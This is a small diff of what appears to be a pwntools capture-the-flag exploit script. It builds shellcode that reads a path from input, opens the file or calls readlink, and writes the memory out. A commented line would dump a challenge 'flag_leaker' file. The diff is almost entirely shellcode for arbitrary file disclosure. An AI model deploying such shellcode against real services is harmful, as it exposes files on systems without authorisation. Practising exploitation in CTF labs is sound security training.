@@ -20,8 +20,8 @@ p += asm( shellcraft.write( 1 , 'sp' , 0x70 ) )
 
 p = asm( shellcraft.read( 0 , 'sp' , 0x70 ) )
 p += asm( shellcraft.open( 'sp' , 0 , 0) )
-p += asm( shellcraft.read( 'x0' , 'sp' , 0x370 ) )
-#p += asm( shellcraft.syscall( 'SYS_readlink' , 'sp' , 'sp' , 0x370 ) )
+#p += asm( shellcraft.read( 'x0' , 'sp' , 0x370 ) )
+p += asm( shellcraft.syscall( 'SYS_readlink' , 'sp' , 'sp' , 0x370 ) )
 p += asm( shellcraft.write( 1 , 'sp' , 0x370 ) )
 
 #p = asm( shellcraft.cat( '/usr/lib/python3.5/flag_leaker/__init__.py' , 1 ) )
